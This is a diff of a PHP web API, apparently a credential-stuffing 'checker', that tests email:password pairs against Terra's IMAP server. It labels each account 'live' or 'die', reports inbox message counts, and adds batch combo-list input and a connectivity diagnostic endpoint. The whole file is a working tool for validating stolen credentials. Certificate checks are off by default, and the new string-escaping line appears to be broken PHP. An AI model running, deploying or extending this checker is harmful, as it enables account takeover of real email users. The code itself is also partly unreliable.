@@ -1,8 +1,9 @@
 <?php
 /**
- * terra_validator_v4.php
- * Validador IMAP via Socket TLS direto (sem extensão imap).
- * Funciona em qualquer hosting com openssl habilitado.
+ * api.php
+ * Validador IMAP Terra via Socket SSL/TLS direto
+ * Sem dependência de extensão imap — só precisa de openssl
+ * Compatível com Render, Heroku, e qualquer hosting com PHP 8+
  */
 declare(strict_types=1);
 header('Content-Type: application/json; charset=utf-8');
@@ -15,20 +16,20 @@ class TerraValidator {
         $this->config = [
             'imap_server'   => getenv('IMAP_HOST') ?: 'imap.terra.com.br',
             'imap_port'     => (int)(getenv('IMAP_PORT') ?: 993),
-            'timeout'       => (int)(getenv('IMAP_TIMEOUT') ?: 15),
-            'max_retries'   => (int)(getenv('MAX_RETRIES') ?: 3),
+            'timeout'       => (int)(getenv('IMAP_TIMEOUT') ?: 25),
+            'max_retries'   => (int)(getenv('MAX_RETRIES') ?: 2),
             'validate_cert' => filter_var(getenv('IMAP_VALIDATE_CERT') ?: 'false', FILTER_VALIDATE_BOOL),
         ];
     }
 
-    // ──────────────────────────────────────────────
-    //  PONTO DE ENTRADA PÚBLICO
-    // ──────────────────────────────────────────────
+    // ════════════════════════════════════════════════════════
+    //  API PÚBLICA
+    // ════════════════════════════════════════════════════════
 
     public function validate(string $email, string $password): array {
-        $attempt   = 0;
-        $last_err  = '';
-        $start     = microtime(true);
+        $attempt  = 0;
+        $last_err = '';
+        $start    = microtime(true);
 
         while ($attempt < $this->config['max_retries']) {
             $attempt++;
@@ -45,26 +46,25 @@ class TerraValidator {
 
                 $last_err = $result['message'] ?? 'Erro desconhecido';
 
-                // Credenciais inválidas → não retentar
+                // Credenciais inválidas → retorna imediato
                 if (($result['reason'] ?? '') === 'invalid_credentials') {
                     $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                     $result['attempts']   = $attempt;
                     return $result;
                 }
 
-                // Erro não-recuperável → não retentar
+                // Erro não-recuperável → retorna imediato
                 if (!($result['retryable'] ?? false)) {
                     $result['elapsed_ms'] = round((microtime(true) - $start) * 1000, 2);
                     $result['attempts']   = $attempt;
                     return $result;
                 }
-
             } catch (\Throwable $e) {
                 $last_err = $e->getMessage();
-                $this->diag[] = 'Exception: ' . $last_err;
+                $this->diag[] = 'Throwable: ' . $last_err;
             }
 
-            // Backoff exponencial: 1s, 2s, 4s...
+            // Backoff exponencial
             if ($attempt < $this->config['max_retries']) {
                 usleep((int)(pow(2, $attempt - 1) * 1000000));
             }
@@ -84,6 +84,7 @@ class TerraValidator {
 
     public function validateBatch(array $credentials): array {
         $results = [];
+
         foreach ($credentials as $cred) {
             $email    = $cred['email']    ?? '';
             $password = $cred['password'] ?? '';
@@ -96,6 +97,7 @@ class TerraValidator {
                 ];
                 continue;
             }
+
             $results[] = $this->validate($email, $password);
         }
 
@@ -108,17 +110,89 @@ class TerraValidator {
         ];
     }
 
-    // ──────────────────────────────────────────────
-    //  CONEXÃO E AUTENTICAÇÃO
-    // ──────────────────────────────────────────────
-
     /**
-     * Conecta via socket TLS, faz handshake IMAP e autentica.
+     * Diagnóstico de conectividade — testa DNS, TCP, TLS e greeting IMAP
      */
+    public function diagnostic(): array {
+        $result = [
+            'server'   => $this->config['imap_server'],
+            'port'     => $this->config['imap_port'],
+            'timeout'  => $this->config['timeout'],
+            'php_ver'  => PHP_VERSION,
+            'ssl_ext'  => extension_loaded('openssl') ? 'yes' : 'NO',
+            'tests'    => [],
+        ];
+
+        // ── Teste 1: DNS ──
+        $dns_start = microtime(true);
+        $ips = @gethostbynamel($this->config['imap_server']);
+        $result['tests']['dns'] = [
+            'ok'         => !empty($ips),
+            'ips'        => $ips ?: [],
+            'elapsed_ms' => round((microtime(true) - $dns_start) * 1000, 2),
+        ];
+
+        if (empty($ips)) {
+            $result['tests']['dns']['error'] = 'Falha ao resolver DNS';
+            return $result;
+        }
+
+        // ── Teste 2: TCP bruto ──
+        $tcp_start = microtime(true);
+        $tcp = @fsockopen($ips[0], $this->config['imap_port'], $errno, $errstr, $this->config['timeout']);
+        $result['tests']['tcp'] = [
+            'ok'         => $tcp !== false,
+            'elapsed_ms' => round((microtime(true) - $tcp_start) * 1000, 2),
+        ];
+
+        if ($tcp === false) {
+            $result['tests']['tcp']['error'] = "errno={$errno}; {$errstr}";
+            $result['tests']['tcp']['note']  = 'Render pode bloquear porta 993. Verifique se outbound ports estão liberados.';
+            return $result;
+        }
+        fclose($tcp);
+
+        // ── Teste 3: SSL/TLS + Greeting IMAP ──
+        $tls_start = microtime(true);
+        $ctx = stream_context_create([
+            'ssl' => [
+                'verify_peer'       => false,
+                'verify_peer_name'  => false,
+                'allow_self_signed' => true,
+            ],
+        ]);
+
+        $remote = sprintf('ssl://%s:%d', $this->config['imap_server'], $this->config['imap_port']);
+        $socket = @stream_socket_client($remote, $errno2, $errstr2, $this->config['timeout'], STREAM_CLIENT_CONNECT, $ctx);
+
+        $result['tests']['tls'] = [
+            'ok'         => $socket !== false,
+            'elapsed_ms' => round((microtime(true) - $tls_start) * 1000, 2),
+        ];
+
+        if ($socket === false) {
+            $result['tests']['tls']['error'] = "errno={$errno2}; {$errstr2}";
+            return $result;
+        }
+
+        stream_set_timeout($socket, $this->config['timeout']);
+        $greeting = @fgets($socket, 8192);
+        fclose($socket);
+
+        $result['tests']['tls']['greeting'] = $greeting ?: '(vazio)';
+        $result['tests']['tls']['imap_ok']  = ($greeting !== false && stripos($greeting, 'OK') !== false);
+
+        return $result;
+    }
+
+    // ════════════════════════════════════════════════════════
+    //  CONEXÃO E AUTENTICAÇÃO IMAP
+    // ════════════════════════════════════════════════════════
+
     private function attemptLogin(string $email, string $password): array {
-        // 1. Resolver DNS
-        $ip = @gethostbynamel($this->config['imap_server']);
-        if (empty($ip)) {
+        // ── 1. Resolver DNS ──
+        $ips = @gethostbynamel($this->config['imap_server']);
+        if (empty($ips)) {
             $this->diag[] = "DNS falhou para {$this->config['imap_server']}";
             return [
                 'status'    => 'die',
@@ -128,14 +202,14 @@ class TerraValidator {
                 'retryable' => true,
             ];
         }
-        $resolved_ip = $ip[0];
-        $this->diag[] = "DNS resolvido: {$resolved_ip}";
+        $this->diag[] = "DNS resolvido: {$ips[0]}";
 
-        // 2. Conectar via socket TCP + TLS
-        $remote   = sprintf('tls://%s:%d', $this->config['imap_server'], $this->config['imap_port']);
-        $errno    = 0;
-        $errstr   = '';
-        $context  = stream_context_create([
+        // ── 2. Conectar via SSL/TLS ──
+        // ssl:// = TLS implícito (correto para porta 993/IMAPS)
+        $remote  = sprintf('ssl://%s:%d', $this->config['imap_server'], $this->config['imap_port']);
+        $errno   = 0;
+        $errstr  = '';
+        $context = stream_context_create([
             'ssl' => [
                 'verify_peer'       => $this->config['validate_cert'],
                 'verify_peer_name'  => $this->config['validate_cert'],
@@ -153,23 +227,24 @@ class TerraValidator {
         );
 
         if ($socket === false) {
-            $this->diag[] = "Socket falhou: errno={$errno} errstr={$errstr}";
+            $this->diag[] = "Socket SSL falhou: errno={$errno} errstr={$errstr}";
             return [
-                'status'    => 'die',
-                'email'     => $email,
-                'message'   => 'Falha de conexão TCP/TLS',
-                'reason'    => 'connection_error',
-                'retryable' => true,
+                'status'       => 'die',
+                'email'        => $email,
+                'message'      => 'Falha de conexão SSL/TLS',
+                'reason'       => 'connection_error',
+                'retryable'    => true,
                 'error_detail' => "errno={$errno}; {$errstr}",
             ];
         }
 
         stream_set_timeout($socket, $this->config['timeout']);
-        $this->diag[] = 'Socket TLS conectado';
+        $this->diag[] = 'Socket SSL conectado';
 
-        // 3. Ler greeting do servidor IMAP
-        $greeting = $this->readLine($socket);
-        if ($greeting === null) {
+        // ── 3. Ler greeting IMAP ──
+        $greeting = @fgets($socket, 8192);
+
+        if ($greeting === false || $greeting === '') {
             fclose($socket);
             $this->diag[] = 'Greeting vazio ou nulo';
             return [
@@ -183,45 +258,48 @@ class TerraValidator {
 
         if (stripos($greeting, 'OK') === false) {
             fclose($socket);
-            $this->diag[] = "Greeting inesperado: {$greeting}";
+            $this->diag[] = "Greeting sem OK: " . trim($greeting);
             return [
-                'status'    => 'die',
-                'email'     => $email,
-                'message'   => 'Servidor não é IMAP válido',
-                'reason'    => 'bad_greeting',
-                'retryable' => false,
+                'status'       => 'die',
+                'email'        => $email,
+                'message'      => 'Servidor não é IMAP válido',
+                'reason'       => 'bad_greeting',
+                'retryable'    => false,
                 'error_detail' => trim($greeting),
             ];
         }
-        $this->diag[] = 'Greeting OK recebido';
+        $this->diag[] = 'Greeting OK: ' . trim($greeting);
 
-        // 4. Enviar comando LOGIN
-        $tag     = 'A0001';
-        $safe_em = $this->escapeImapString($email);
-        $safe_pw = $this->escapeImapString($password);
-        $cmd     = sprintf("%s LOGIN %s %s\r\n", $tag, $safe_em, $safe_pw);
+        // ── 4. Enviar comando LOGIN ──
+        $tag  = 'A001';
+        $cmd  = sprintf(
+            "%s LOGIN %s %s\r\n",
+            $tag,
+            $this->escapeImapString($email),
+            $this->escapeImapString($password)
+        );
 
         $written = fwrite($socket, $cmd);
         if ($written === false) {
             fclose($socket);
-            $this->diag[] = 'Falha ao enviar LOGIN';
+            $this->diag[] = 'Falha ao escrever no socket';
             return [
                 'status'    => 'die',
                 'email'     => $email,
-                'message'   => 'Falha ao enviar comando',
+                'message'   => 'Falha ao enviar comando LOGIN',
                 'reason'    => 'write_error',
                 'retryable' => true,
             ];
         }
-        $this->diag[] = 'Comando LOGIN enviado';
+        $this->diag[] = "LOGIN enviado ({$written} bytes)";
 
-        // 5. Ler resposta até linha tagged
+        // ── 5. Ler resposta até a linha tagged ──
         $response = $this->readUntilTag($socket, $tag);
         $meta     = stream_get_meta_data($socket);
 
-        if ($response === null) {
+        if ($response === null || $response === '') {
             fclose($socket);
-            $this->diag[] = 'Resposta nula do LOGIN';
+            $this->diag[] = 'Resposta nula após LOGIN';
             return [
                 'status'    => 'die',
                 'email'     => $email,
@@ -243,52 +321,54 @@ class TerraValidator {
             ];
         }
 
-        // 6. Analisar resposta
-        $resp_lower = strtolower($response);
+        $this->diag[] = 'Resposta bruta: ' . trim($response);
 
-        // A1 OK — autenticado com sucesso
-        if (preg_match('/' . preg_quote($tag, '/') . '\s+OK/i', $response)) {
-            $num_messages = $this->tryFetchMessageCount($socket);
+        // ── 6. Analisar resposta ──
+        $quoted_tag = preg_quote($tag, '/');
+
+        // A001 OK — sucesso
+        if (preg_match('/' . $quoted_tag . '\s+OK/i', $response)) {
+            $msgs = $this->tryMessageCount($socket);
 
             // Logout limpo
-            fwrite($socket, "A0002 LOGOUT\r\n");
+            fwrite($socket, "A002 LOGOUT\r\n");
             fclose($socket);
 
-            $this->diag[] = 'Login OK';
+            $this->diag[] = 'Login OK — autenticado';
             return [
                 'status'           => 'live',
                 'email'            => $email,
                 'message'          => 'Autenticação bem-sucedida',
-                'mailbox_messages' => $num_messages,
+                'mailbox_messages' => $msgs,
                 'authenticated_at' => date('Y-m-d H:i:s'),
             ];
         }
 
-        // A1 NO — credenciais inválidas
-        if (preg_match('/' . preg_quote($tag, '/') . '\s+NO/i', $response)) {
+        // A001 NO — credenciais inválidas
+        if (preg_match('/' . $quoted_tag . '\s+NO/i', $response)) {
             fclose($socket);
-            $this->diag[] = 'Login NO (credenciais inválidas)';
+            $this->diag[] = 'Login NO — credenciais inválidas';
             return [
-                'status'    => 'die',
-                'email'     => $email,
-                'message'   => 'Invalid credentials',
-                'reason'    => 'invalid_credentials',
-                'retryable' => false,
-                'error_detail' => $this->extractImapError($response),
+                'status'       => 'die',
+                'email'        => $email,
+                'message'      => 'Invalid credentials',
+                'reason'       => 'invalid_credentials',
+                'retryable'    => false,
+                'error_detail' => $this->cleanImapResponse($response, $tag),
             ];
         }
 
-        // A1 BAD — comando rejeitado
-        if (preg_match('/' . preg_quote($tag, '/') . '\s+BAD/i', $response)) {
+        // A001 BAD — comando rejeitado
+        if (preg_match('/' . $quoted_tag . '\s+BAD/i', $response)) {
             fclose($socket);
-            $this->diag[] = 'Login BAD: ' . trim($response);
+            $this->diag[] = 'Login BAD — comando rejeitado: ' . trim($response);
             return [
-                'status'    => 'die',
-                'email'     => $email,
-                'message'   => 'Comando rejeitado pelo servidor',
-                'reason'    => 'bad_command',
-                'retryable' => false,
-                'error_detail' => $this->extractImapError($response),
+                'status'       => 'die',
+                'email'        => $email,
+                'message'      => 'Comando rejeitado pelo servidor',
+                'reason'       => 'bad_command',
+                'retryable'    => false,
+                'error_detail' => $this->cleanImapResponse($response, $tag),
             ];
         }
 
@@ -296,29 +376,21 @@ class TerraValidator {
         fclose($socket);
         $this->diag[] = 'Resposta inesperada: ' . trim($response);
         return [
-            'status'    => 'die',
-            'email'     => $email,
-            'message'   => 'Resposta IMAP inesperada',
-            'reason'    => 'unexpected_response',
-            'retryable' => true,
+            'status'       => 'die',
+            'email'        => $email,
+            'message'      => 'Resposta IMAP inesperada',
+            'reason'       => 'unexpected',
+            'retryable'    => true,
             'error_detail' => trim($response),
         ];
     }
 
-    // ──────────────────────────────────────────────
+    // ════════════════════════════════════════════════════════
     //  HELPERS DE LEITURA DO SOCKET
-    // ──────────────────────────────────────────────
+    // ════════════════════════════════════════════════════════
 
     /**
-     * Lê uma única linha do socket.
-     */
-    private function readLine($socket): ?string {
-        $line = @fgets($socket, 8192);
-        return ($line !== false && $line !== '') ? $line : null;
-    }
-
-    /**
-     * Lê todas as linhas até encontrar a tagged response (A0001 OK/NO/BAD).
+     * Lê todas as linhas até encontrar a tagged response.
      */
     private function readUntilTag($socket, string $tag): ?string {
         $buffer   = '';
@@ -331,12 +403,18 @@ class TerraValidator {
             }
             $buffer .= $line;
 
-            // Linha tagged encontrada?
+            // Linha tagged encontrada (ex: "A001 OK LOGIN completed")
             if (strpos(trim($line), $tag . ' ') === 0) {
                 return $buffer;
             }
 
-            // Timeout
+            // Verifica timeout do stream
+            $meta = stream_get_meta_data($socket);
+            if (!empty($meta['timed_out'])) {
+                break;
+            }
+
+            // Deadline manual
             if (microtime(true) > $deadline) {
                 break;
             }
@@ -345,35 +423,32 @@ class TerraValidator {
         return $buffer !== '' ? $buffer : null;
     }
 
-    // ──────────────────────────────────────────────
+    // ════════════════════════════════════════════════════════
     //  HELPERS DE PROTOCOLO IMAP
-    // ──────────────────────────────────────────────
+    // ════════════════════════════════════════════════════════
 
     /**
-     * Escapa string para o protocolo IMAP (RFC 3501).
-     * Strings com caracteres especiais usam literais {n}\r\n.
+     * Escapa string para IMAP quoted string (RFC 3501).
+     * Escapa apenas \ e " — todos os outros caracteres são válidos entre aspas.
      */
     private function escapeImapString(string $str): string {
-        // Se contém aspas, barras invertidas ou caracteres de controle → literal
-        if (preg_match('/[\x00-\x1F\x7F"\\]/', $str)) {
-            $len = strlen($str);
-            return sprintf('{%d}', $len);
-            // O servidor responderá com + e então enviamos a string
-            // Mas para simplicidade, usamos aspas duplas com escape
-        }
-        return '"' . $str . '"';
+        $escaped = str_replace(['\', '"'], ['\\', '\"'], $str);
+        return '"' . $escaped . '"';
     }
 
     /**
-     * Extrai mensagem de erro de uma resposta IMAP tagged.
+     * Limpa a resposta IMAP removendo a tag e o status (OK/NO/BAD).
      */
-    private function extractImapError(string $response): string {
+    private function cleanImapResponse(string $response, string $tag): string {
         $lines = explode("\r\n", $response);
         foreach (array_reverse($lines) as $line) {
             $line = trim($line);
-            if ($line !== '') {
-                // Remove a tag e o status (OK/NO/BAD)
-                $cleaned = preg_replace('/^A\d+\s+(OK|NO|BAD)\s*/i', '', $line);
+            if ($line !== '' && strpos($line, $tag . ' ') === 0) {
+                $cleaned = preg_replace(
+                    '/^' . preg_quote($tag, '/') . '\s+(OK|NO|BAD)\s*/i',
+                    '',
+                    $line
+                );
                 return $cleaned;
             }
         }
@@ -381,27 +456,19 @@ class TerraValidator {
     }
 
     /**
-     * Tenta obter contagem de mensagens após login bem-sucedido.
+     * Tenta obter contagem de mensagens via STATUS INBOX (MESSAGES).
      */
-    private function tryFetchMessageCount($socket): int {
-        // Envia STATUS INBOX (MESSAGES)
-        $tag = 'A0001S';
-        $cmd = sprintf("%s STATUS INBOX (MESSAGES)\r\n", $tag);
-        fwrite($socket, $cmd);
+    private function tryMessageCount($socket): int {
+        $tag = 'S001';
+        $cmd = "{$tag} STATUS INBOX (MESSAGES)\r\n";
 
-        $resp = $this->readUntilTag($socket, $tag);
-        if ($resp !== null && preg_match('/MESSAGES\s+(\d+)/i', $resp, $m)) {
-            return (int)$m[1];
+        if (fwrite($socket, $cmd) === false) {
+            return 0;
         }
 
-        // Fallback: SELECT INBOX e ler EXISTS
-        $tag2 = 'A0001C';
-        fwrite($socket, sprintf("%s SELECT INBOX\r\n", $tag2));
-        $resp2 = $this->readUntilTag($socket, $tag2);
-        if ($resp2 !== null && preg_match('/(\d+)\s+EXISTS/i', $resp2, $m)) {
-            // Fecha a mailbox
-            fwrite($socket, sprintf("%s CLOSE\r\n", 'A0001D'));
-            $this->readUntilTag($socket, 'A0001D');
+        $resp = $this->readUntilTag($socket, $tag);
+
+        if ($resp !== null && preg_match('/MESSAGES\s+(\d+)/i', $resp, $m)) {
             return (int)$m[1];
         }
 
@@ -409,43 +476,90 @@ class TerraValidator {
     }
 }
 
-// ════════════════════════════════════════════════
-//  EXECUÇÃO
-// ════════════════════════════════════════════════
+// ════════════════════════════════════════════════════════════════
+//  ROTEAMENTO PRINCIPAL
+// ════════════════════════════════════════════════════════════════
 
-$input = $_POST;
-$content_type = $_SERVER['CONTENT_TYPE'] ?? '';
+$action = $_GET['action'] ?? '';
+$validator = new TerraValidator();
 
-if (empty($input) && stripos($content_type, 'application/json') !== false) {
-    $raw = file_get_contents('php://input');
-    if (!empty($raw)) {
-        $decoded = json_decode($raw, true);
-        if (is_array($decoded)) {
-            $input = $decoded;
+// ── Endpoint de diagnóstico ──
+// GET /api.php?action=diagnostic
+if ($action === 'diagnostic') {
+    echo json_encode($validator->diagnostic(), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    exit;
+}
+
+// ── Endpoint de checagem ──
+// POST /api.php?action=check
+if ($action === 'check' || $action === '') {
+
+    // Aceita POST form-data OU JSON
+    $input = $_POST;
+    $ct = $_SERVER['CONTENT_TYPE'] ?? '';
+
+    if (empty($input) && stripos($ct, 'application/json') !== false) {
+        $raw = file_get_contents('php://input');
+        if (!empty($raw)) {
+            $decoded = json_decode($raw, true);
+            if (is_array($decoded)) {
+                $input = $decoded;
+            }
         }
     }
+
+    $email    = $input['email']    ?? '';
+    $password = $input['password'] ?? '';
+    $batch    = $input['batch']    ?? null;
+
+    // Formato alternativo: email:password em campo único
+    if ($email === '' && !empty($input['cred'])) {
+        $parts = explode(':', $input['cred'], 2);
+        if (count($parts) === 2) {
+            $email    = trim($parts[0]);
+            $password = trim($parts[1]);
+        }
+    }
+
+    // Formato alternativo: lista de email:password em texto
+    if ($email === '' && empty($batch) && !empty($input['list'])) {
+        $lines = array_filter(array_map('trim', explode("\n", $input['list'])));
+        $batch = [];
+        foreach ($lines as $line) {
+            $parts = explode(':', $line, 2);
+            if (count($parts) === 2) {
+                $batch[] = ['email' => trim($parts[0]), 'password' => trim($parts[1])];
+            }
+        }
+    }
+
+    // Executa validação
+    if ($batch && is_array($batch) && count($batch) > 0) {
+        // Modo lote
+        echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+
+    } elseif ($email !== '' && $password !== '') {
+        // Modo simples
+        echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+
+    } else {
+        // Erro — sem credenciais
+        http_response_code(400);
+        echo json_encode([
+            'error' => 'Credenciais ausentes',
+            'usage' => [
+                'json'  => 'POST {"email":"user@terra.com.br","password":"senha"}',
+                'form'  => 'POST email=user@terra.com.br&password=senha',
+                'cred'  => 'POST cred=user@terra.com.br:senha',
+                'batch' => 'POST {"batch":[{"email":"...","password":"..."}]}',
+                'list'  => 'POST list=user1@terra.com.br:pass1\\nuser2@terra.com.br:pass2',
+            ],
+            'diagnostic' => 'GET /api.php?action=diagnostic',
+        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    }
+    exit;
 }
 
-$email    = $input['email']    ?? '';
-$password = $input['password'] ?? '';
-$batch    = $input['batch']    ?? null;
-
-if ($batch && is_array($batch)) {
-    $validator = new TerraValidator();
-    echo json_encode($validator->validateBatch($batch), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
-
-} elseif ($email !== '' && $password !== '') {
-    $validator = new TerraValidator();
-    echo json_encode($validator->validate($email, $password), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
-
-} else {
-    http_response_code(400);
-    echo json_encode([
-        'error' => 'Credenciais ausentes',
-        'usage' => [
-            'simple' => 'POST email=user@terra.com.br&password=senha123',
-            'json'   => 'POST {"email":"user@terra.com.br","password":"senha123"}',
-            'batch'  => 'POST {"batch":[{"email":"user1@terra.com.br","password":"pass1"},...]}',
-        ],
-    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
-}
+// ── Action desconhecido ──
+http_response_code(404);
+echo json_encode(['error' => 'Action desconhecida: ' . $action], JSON_UNESCAPED_UNICODE);
